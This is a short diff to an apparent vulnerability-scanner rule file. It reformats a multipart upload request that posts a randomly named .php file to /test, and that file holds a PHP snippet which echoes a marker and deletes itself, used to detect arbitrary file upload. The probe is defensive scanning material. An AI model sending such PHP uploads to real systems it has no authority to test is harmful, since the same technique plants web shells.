@@ -1040,13 +1040,14 @@ rules:
       path: /test
       headers:
         Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
-      body: |-
-        ------WebKitFormBoundary{{rboundary}}
-        Content-Disposition: form-data; name="file-upload"; filename="{{r1}}.php"
-        Content-Type: application/octet-stream
-
-        <?php echo "{{r2}}"; unlink(__FILE__); ?>
-        ------WebKitFormBoundary{{rboundary}}--
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file-upload\"; filename=\"{{r1}}.php\"\r\n\
+        Content-Type: application/octet-stream\r\n\
+        \r\n\
+        <?php echo \"{{r2}}\"; unlink(__FILE__); ?>\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
       follow_redirects: false
     expression: response.status == 200 && response.body_string.contains(r1)
     output:
